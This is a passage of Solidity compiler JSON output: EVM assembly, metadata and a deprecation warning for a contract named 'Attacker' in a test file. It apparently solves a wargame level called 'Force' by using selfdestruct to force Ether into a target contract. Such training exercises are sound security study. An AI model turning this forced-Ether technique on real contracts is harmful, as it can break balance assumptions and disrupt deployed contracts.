									"begin": 170,
									"end": 195,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 128,
									"end": 202,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 84,
									"end": 494,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 84,
									"end": 494,
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 88,
									"end": 205,
									"name": "tag",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 88,
									"end": 205,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 197,
									"end": 198,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 194,
									"end": 195,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 187,
									"end": 199,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"name": "tag",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 334,
									"end": 460,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 371,
									"end": 378,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 411,
									"end": 453,
									"name": "PUSH",
									"source": 2,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 404,
									"end": 409,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 400,
									"end": 454,
									"name": "AND",
									"source": 2
								},
								{
									"begin": 389,
									"end": 454,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 389,
									"end": 454,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"name": "tag",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 466,
									"end": 562,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 503,
									"end": 510,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "21"
								},
								{
									"begin": 550,
									"end": 555,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 532,
									"end": 556,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 532,
									"end": 556,
									"name": "tag",
									"source": 2,
									"value": "21"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 521,
									"end": 556,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 521,
									"end": 556,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 568,
									"end": 675,
									"name": "tag",
									"source": 2,
									"value": "12"
								},
								{
									"begin": 568,
									"end": 675,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 616,
									"end": 623,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 645,
									"end": 669,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "23"
								},
								{
									"begin": 663,
									"end": 668,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 645,
									"end": 669,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 645,
									"end": 669,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 645,
									"end": 669,
									"name": "tag",
									"source": 2,
									"value": "23"
								},
								{
									"begin": 645,
									"end": 669,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 634,
									"end": 669,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 634,
									"end": 669,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 568,
									"end": 675,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 568,
									"end": 675,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 568,
									"end": 675,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 568,
									"end": 675,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 681,
									"end": 825,
									"name": "tag",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 681,
									"end": 825,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 765,
									"end": 800,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "25"
								},
								{
									"begin": 794,
									"end": 799,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 765,
									"end": 800,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "12"
								},
								{
									"begin": 765,
									"end": 800,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 765,
									"end": 800,
									"name": "tag",
									"source": 2,
									"value": "25"
								},
								{
									"begin": 765,
									"end": 800,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 758,
									"end": 763,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 755,
									"end": 801,
									"name": "EQ",
									"source": 2
								},
								{
									"begin": 745,
									"end": 819,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "26"
								},
								{
									"begin": 745,
									"end": 819,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 815,
									"end": 816,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 812,
									"end": 813,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 805,
									"end": 817,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 745,
									"end": 819,
									"name": "tag",
									"source": 2,
									"value": "26"
								},
								{
									"begin": 745,
									"end": 819,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 681,
									"end": 825,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 681,
									"end": 825,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 831,
									"end": 996,
									"name": "tag",
									"source": 2,
									"value": "14"
								},
								{
									"begin": 831,
									"end": 996,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 899,
									"end": 904,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 930,
									"end": 936,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 924,
									"end": 937,
									"name": "MLOAD",
									"source": 2
								},
								{
									"begin": 915,
									"end": 937,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 915,
									"end": 937,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 946,
									"end": 990,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "28"
								},
								{
									"begin": 984,
									"end": 989,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 946,
									"end": 990,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 946,
									"end": 990,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 946,
									"end": 990,
									"name": "tag",
									"source": 2,
									"value": "28"
								},
								{
									"begin": 946,
									"end": 990,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 831,
									"end": 996,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 831,
									"end": 996,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 831,
									"end": 996,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 831,
									"end": 996,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 831,
									"end": 996,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 1002,
									"end": 1375,
									"name": "tag",
									"source": 2,
									"value": "3"
								},
								{
									"begin": 1002,
									"end": 1375,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 1083,
									"end": 1089,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 1132,
									"end": 1134,
									"name": "PUSH",
									"source": 2,
									"value": "20"
								},
								{
									"begin": 1120,
									"end": 1129,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 1111,
									"end": 1118,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 1107,
									"end": 1130,
									"name": "SUB",
									"source": 2
								},
								{
									"begin": 1103,
									"end": 1135,
									"name": "SLT",
									"source": 2
								},
								{
									"begin": 1100,
									"end": 1219,
									"name": "ISZERO",
									"source": 2
								},
								{
									"begin": 1100,
									"end": 1219,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "30"
								},
								{
									"begin": 1100,
									"end": 1219,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 1138,
									"end": 1217,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "31"
								},
								{
									"begin": 1138,
									"end": 1217,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 1138,
									"end": 1217,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 1138,
									"end": 1217,
									"name": "tag",
									"source": 2,
									"value": "31"
								},
								{
									"begin": 1138,
									"end": 1217,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 1100,
									"end": 1219,
									"name": "tag",
									"source": 2,
									"value": "30"
								},
								{
									"begin": 1100,
									"end": 1219,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 1258,
									"end": 1259,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 1283,
									"end": 1358,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "32"
								},
								{
									"begin": 1350,
									"end": 1357,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 1341,
									"end": 1347,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 1330,
									"end": 1339,
									"name": "DUP6",
									"source": 2
								},
								{
									"begin": 1326,
									"end": 1348,
									"name": "ADD",
									"source": 2
								},
								{
									"begin": 1283,
									"end": 1358,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "14"
								},
								{
									"begin": 1283,
									"end": 1358,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 1283,
									"end": 1358,
									"name": "tag",
									"source": 2,
									"value": "32"
								},
								{
									"begin": 1283,
									"end": 1358,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 1273,
									"end": 1358,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 1273,
									"end": 1358,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 1229,
									"end": 1368,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 1002,
									"end": 1375,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 1002,
									"end": 1375,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 1002,
									"end": 1375,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 1002,
									"end": 1375,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 1002,
									"end": 1375,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 84,
									"end": 494,
									"name": "tag",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 84,
									"end": 494,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 84,
									"end": 494,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 84,
									"end": 494,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 84,
									"end": 494,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 84,
									"end": 494,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 84,
									"end": 494,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 84,
									"end": 494,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 84,
									"end": 494,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122025d6d4c61fa7b32ffa9e44b4ae5c1e1165ebe425ac8422290a648572452fbfb564736f6c63430008180033",
									".code": [
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH",
											"source": 1,
											"value": "12065FE0"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH",
											"source": 1,
											"value": "9E5FAAFC"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 84,
											"end": 494,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 84,
											"end": 494,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 357,
											"end": 456,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 357,
											"end": 456,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 357,
											"end": 456,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 357,
											"end": 456,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 357,
											"end": 456,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 357,
											"end": 456,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 357,
											"end": 456,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 357,
											"end": 456,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 357,
											"end": 456,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 357,
											"end": 456,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 357,
											"end": 456,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 357,
											"end": 456,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 208,
											"end": 351,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 208,
											"end": 351,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 208,
											"end": 351,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 208,
											"end": 351,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 208,
											"end": 351,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 208,
											"end": 351,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 208,
											"end": 351,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 208,
											"end": 351,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 357,
											"end": 456,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 401,
											"end": 405,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 428,
											"end": 449,
											"name": "SELFBALANCE",
											"source": 1
										},
										{
											"begin": 421,
											"end": 449,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 421,
											"end": 449,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 357,
											"end": 456,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 208,
											"end": 351,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 208,
											"end": 351,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 256,
											"end": 282,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 301,
											"end": 308,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 301,
											"end": 308,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 301,
											"end": 308,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 301,
											"end": 308,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 301,
											"end": 308,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 301,
											"end": 308,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 301,
											"end": 308,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 301,
											"end": 308,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 301,
											"end": 308,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 301,
											"end": 308,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 301,
											"end": 308,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 256,
											"end": 310,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 256,
											"end": 310,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 333,
											"end": 343,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 320,
											"end": 344,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 320,
											"end": 344,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 320,
											"end": 344,
											"name": "SELFDESTRUCT",
											"source": 1
										},
										{
											"begin": 7,
											"end": 84,
											"name": "tag",
											"source": 2,
											"value": "16"
										},
										{
											"begin": 7,
											"end": 84,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 44,
											"end": 51,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 73,
											"end": 78,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 62,
											"end": 78,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 62,
											"end": 78,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 7,
											"end": 84,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 7,
											"end": 84,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 7,
											"end": 84,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 7,
											"end": 84,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 90,
											"end": 208,
											"name": "tag",
											"source": 2,
											"value": "17"
										},
										{
											"begin": 90,
											"end": 208,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "21"
										},
										{
											"begin": 195,
											"end": 200,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "16"
										},
										{
											"begin": 177,
											"end": 201,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 177,
											"end": 201,
											"name": "tag",
											"source": 2,
											"value": "21"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 172,
											"end": 175,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 165,
											"end": 202,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 90,
											"end": 208,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 90,
											"end": 208,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 90,
											"end": 208,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 214,
											"end": 436,
											"name": "tag",
											"source": 2,
											"value": "11"
										},
										{
											"begin": 214,
											"end": 436,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 307,
											"end": 311,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 345,
											"end": 347,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 334,
											"end": 343,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 330,
											"end": 348,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 322,
											"end": 348,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 322,
											"end": 348,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 358,
											"end": 429,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "23"
										},
										{
											"begin": 426,
											"end": 427,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 415,
											"end": 424,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 411,
											"end": 428,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 402,
											"end": 408,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 358,
											"end": 429,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "17"
										},
										{
											"begin": 358,
											"end": 429,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 358,
											"end": 429,
											"name": "tag",
											"source": 2,
											"value": "23"
										},
										{
											"begin": 358,
											"end": 429,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 214,
											"end": 436,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 214,
											"end": 436,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 214,
											"end": 436,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 214,
											"end": 436,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 214,
											"end": 436,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										}
									]
								}
							},
							"sourceList": [
								"src/level07.sol",
								"tests/test07.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"attack()": "9e5faafc",
							"getBalance()": "12065fe0"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.24+commit.e11b9ed9\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract Force\",\"name\":\"_level07\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"tests/test07.sol\":\"Attacker\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/level07.sol\":{\"keccak256\":\"0xf53390973d7d18f12d7f4793246c9e975e3dc79747a5b19d7aa208d822e3c0a0\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://b06a24e8ced7e4d911bde16ff4e0a1bf9b268fdf208d792a8ccaeb76b4683fd0\",\"dweb:/ipfs/Qma7Gttk6FzF1DApBB6vPWxrdNJxWXaAHQ45zdAYTfSdjg\"]},\"tests/test07.sol\":{\"keccak256\":\"0x2a0535567ad4c29ceba3ffb21deb5e0558ac5c00a96ef312e4dc26dbc4df7d0c\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://b129380ef58bd88f5c778b0b5ef26dae676f1ba0b84ef602dafb078a55e79437\",\"dweb:/ipfs/QmXmR6hiUSgp9GjdCEU6ET5Tsaf18kxHSPCmFc5M7YfQ83\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 8,
								"contract": "tests/test07.sol:Attacker",
								"label": "level07",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(Force)2"
							}
						],
						"types": {
							"t_contract(Force)2": {
								"encoding": "inplace",
								"label": "contract Force",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "5159",
				"formattedMessage": "Warning: \"selfdestruct\" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.\n  --> tests/test07.sol:18:9:\n   |\n18 |         selfdestruct(theAddress);\n   |         ^^^^^^^^^^^^\n\n",
				"message": "\"selfdestruct\" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.",
				"severity": "warning",
				"sourceLocation": {
					"end": 332,
					"file": "tests/test07.sol",
